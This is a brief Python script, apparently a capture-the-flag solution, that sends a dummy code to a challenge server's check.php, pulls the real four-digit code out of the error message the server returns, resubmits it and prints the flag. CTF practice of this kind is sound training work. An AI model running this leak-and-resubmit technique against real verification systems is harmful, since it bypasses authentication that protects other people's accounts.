import requests

url = "http://139.59.230.119:10416/check.php" 
session = requests.Session()

# initilize with back end
session.post(url, data={"init": "1"})

# This shit is so dumb man :D
r = session.post(url,data={"code" : 0000})
data = r.json()
real_code = data.get("message")[-4:]

r = session.post(url, data={"code" : real_code})
data = r.json() 
print(data.get("flag"))
